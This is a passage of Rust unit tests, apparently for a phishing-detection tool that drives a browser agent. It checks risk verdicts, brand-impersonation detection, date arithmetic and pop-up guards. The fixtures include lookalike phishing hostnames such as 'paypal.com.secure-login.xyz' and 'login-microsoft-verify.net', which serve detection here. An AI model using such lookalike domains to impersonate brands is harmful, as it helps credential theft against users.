            let mut dump: Vec<Value> = seen.iter().map(|(k, v)| { let mut v = v.clone(); v["type"] = json!(k); v["run"] = json!(1); v }).collect();
            let mut last = verdict.clone();
            last["type"] = json!("verdict");
            last["run"] = json!(1);
            dump.push(last);
            std::fs::write(path, serde_json::to_vec(&dump).unwrap()).unwrap();
        }
        let frames = seen.iter().filter(|(k, _)| k == "frame").count();
        eprintln!("frames streamed: {frames}");
        assert!(frames > 3, "the screen is streamed");
        assert!(seen.iter().any(|(k, v)| k == "step" && v["action"] == "click" && v["target"]["px"].as_f64().is_some()));
        assert!(verdict["risk"].as_i64().unwrap() >= 70);
        assert!(!browser.profile.exists(), "the agent's profile is removed");
    }

    #[test]
    fn brands_are_claimed_only_off_their_own_sites() {
        assert_eq!(brands_claimed("PayPal: Log in to your account", "evil.example"), vec!["PayPal"]);
        assert!(brands_claimed("PayPal: Log in to your account", "paypal.com").is_empty());
        assert!(brands_claimed("Amazon.de: Günstige Preise", "amazon.de").is_empty());
        assert!(brands_claimed("Google Search tips", "google.fr").is_empty());
        // whole words only: "pop-ups" is not UPS, "dhlexpress" is not a word match
        assert!(brands_claimed("block pop-ups", "example.com").is_empty());
        assert_eq!(brands_in_host("paypal.com.secure-login.xyz"), vec!["PayPal"]);
        assert_eq!(brands_in_host("login-microsoft-verify.net"), vec!["Microsoft"]);
        assert!(brands_in_host("www.paypal.com").is_empty());
        assert!(brands_in_host("login.microsoftonline.com").is_empty());
    }

    #[test]
    fn dates_count_days() {
        assert_eq!(days_from_civil(1970, 1, 1), 0);
        assert_eq!(days_from_civil(2000, 3, 1), 11_017);
        assert_eq!(days_since("1970-01-02T00:00:00Z"), Some(today() - 1));
        assert_eq!(days_since("garbage"), None);
    }

    #[test]
    fn the_guard_records_new_windows_instead_of_opening_them() {
        assert!(GUARD_JS.contains("window.open=function"));
        assert!(GUARD_JS.contains("return null"));
        assert!(INSPECT_JS.contains("querySelectorAll('[target]').forEach(e=>e.removeAttribute('target'))"));
    }
}
